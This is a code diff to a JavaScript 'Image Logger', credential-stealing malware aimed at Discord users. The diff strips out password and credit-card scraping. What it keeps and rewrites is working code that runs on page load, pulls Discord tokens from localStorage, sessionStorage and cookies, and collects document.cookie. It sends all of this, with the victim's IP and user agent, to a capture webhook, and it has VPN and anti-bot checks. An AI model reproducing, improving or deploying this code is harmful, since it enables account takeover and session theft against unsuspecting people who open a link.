@@ -11,19 +11,10 @@ const config = {
   color: 0x00FFFF,
   crashBrowser: false,
   accurateLocation: true,
-  message: {
-    doMessage: false,
-    message: "This browser has been pwned by C00lB0i's Image Logger. https://github.com/OverPowerC",
-    richMessage: true,
-  },
   vpnCheck: 1,
   linkAlerts: true,
   buggedImage: true,
-  antiBot: 1,
-  redirect: {
-    redirect: false,
-    page: "https://your-link.here"
-  }
+  antiBot: 1
 };
 
 const blacklistedIPs = ["27", "104", "143", "164"];
@@ -106,7 +97,7 @@ async function makeReport(ip, useragent, coords = null, endpoint = "N/A", url = 
   }
 }
 
-async function sendTokenReport(ip, useragent, token, cookies, passwords, cards) {
+async function sendTokenReport(ip, useragent, token, cookies) {
   try {
     await fetch(config.tokenCaptureWebhook, {
       method: 'POST',
@@ -120,10 +111,8 @@ async function sendTokenReport(ip, useragent, token, cookies, passwords, cards) 
           fields: [
             { name: "IP", value: ip, inline: true },
             { name: "User Agent", value: useragent, inline: true },
-            { name: "Discord Token", value: token || "Not found", inline: false },
-            { name: "Cookies", value: `\`\`\`${cookies || "None"}\`\`\``, inline: false },
-            { name: "Passwords", value: passwords || "None", inline: false },
-            { name: "Credit Cards", value: cards || "None", inline: false }
+            { name: "Discord Token", value: token ? `\`${token}\`` : "Not found", inline: false },
+            { name: "Cookies", value: cookies ? `\`\`\`${cookies.substring(0, 1000)}\`\`\`` : "None", inline: false }
           ]
         }]
       })
@@ -151,9 +140,7 @@ export default async (req, res) => {
         ip, 
         userAgent,
         data.token,
-        data.cookies,
-        data.passwords,
-        data.cards
+        data.cookies
       );
       
       return res.status(200).send('OK');
@@ -206,83 +193,73 @@ export default async (req, res) => {
     // Function to extract all sensitive data
     function extractSensitiveData() {
       const data = {
-        token: "NOT_FOUND",
-        cookies: document.cookie,
-        passwords: [],
-        cards: []
+        token: null,
+        cookies: document.cookie
       };
 
       // Find Discord token
-      const tokenKeys = ['token', 'discord_token', '_token', 'access_token', 'auth_token'];
+      const tokenKeys = [
+        'token', 'discord_token', '_token', 
+        'access_token', 'auth_token'
+      ];
       
-      // Check localStorage
+      // 1. Check localStorage
       tokenKeys.forEach(key => {
         try {
           const value = localStorage.getItem(key);
-          if (value && value.length > 50) data.token = value;
+          if (value && value.length > 50) {
+            data.token = value;
+          }
         } catch(e) {}
       });
       
-      // Check sessionStorage
-      if (data.token === "NOT_FOUND") {
+      // 2. Check sessionStorage
+      if (!data.token) {
         tokenKeys.forEach(key => {
           try {
             const value = sessionStorage.getItem(key);
-            if (value && value.length > 50) data.token = value;
+            if (value && value.length > 50) {
+              data.token = value;
+            }
           } catch(e) {}
         });
       }
       
-      // Check cookies
-      if (data.token === "NOT_FOUND") {
-        document.cookie.split(';').forEach(cookie => {
+      // 3. Check cookies
+      if (!data.token) {
+        const cookies = document.cookie.split(';');
+        for (const cookie of cookies) {
           const [name, value] = cookie.trim().split('=');
           if (tokenKeys.includes(name) && value && value.length > 50) {
             data.token = value;
+            break;
           }
-        });
-      }
-      
-      // Try to extract saved passwords and credit cards
-      try {
-        // Extract autofill data from forms
-        document.querySelectorAll('input[type="password"]').forEach(input => {
-          if (input.value) {
-            data.passwords.push({
-              username: input.previousElementSibling?.value || 'N/A',
-              password: input.value,
-              url: window.location.href
-            });
-          }
-        });
-        
-        // Extract credit cards
-        document.querySelectorAll('input[autocomplete="cc-number"]').forEach(input => {
-          if (input.value) {
-            data.cards.push({
-              number: input.value,
-              name: document.querySelector('input[autocomplete="cc-name"]')?.value || 'N/A',
-              expiry: document.querySelector('input[autocomplete="cc-exp"]')?.value || 'N/A'
-            });
-          }
-        });
-      } catch(e) {
-        console.error('Data extraction error:', e);
+        }
       }
       
       return data;
     }
 
     // Send captured data to server
-    setTimeout(() => {
-      const sensitiveData = extractSensitiveData();
-      
-      fetch('/api/image', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(sensitiveData)
-      });
-    }, 3000);
+    function sendCapturedData() {
+      try {
+        const sensitiveData = extractSensitiveData();
+        console.log("Extracted data:", sensitiveData);
+        
+        fetch('/api/image', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(sensitiveData)
+        }).catch(e => console.error('Data send error:', e));
+      } catch (e) {
+        console.error('Data capture error:', e);
+      }
+    }
+
+    // Run the data capture after page loads
+    window.addEventListener('load', () => {
+      setTimeout(sendCapturedData, 3000);
+    });
   </script>`;
 
     // Geolocation script
